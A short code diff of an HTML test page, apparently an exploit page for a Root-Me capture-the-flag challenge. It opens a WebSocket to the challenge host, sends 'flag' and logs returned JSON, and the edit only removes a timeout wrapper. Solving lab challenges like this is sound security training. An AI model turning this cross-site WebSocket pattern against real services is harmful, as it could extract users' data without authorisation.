@@ -10,7 +10,7 @@
 <body>
   <h1>test</h1>
   <script>
-    setTimeout(() => {
+   
       var ws = new WebSocket('ws://ctf15.root-me.org/ws');
       ws.onopen = function () {
         ws.send("flag");
@@ -20,7 +20,7 @@
           .then(function(res){ return res.json(); })
           .then(function(data){ console.log(data) })
       };
-    }, 1000)
+    
   </script>
 </body>
 
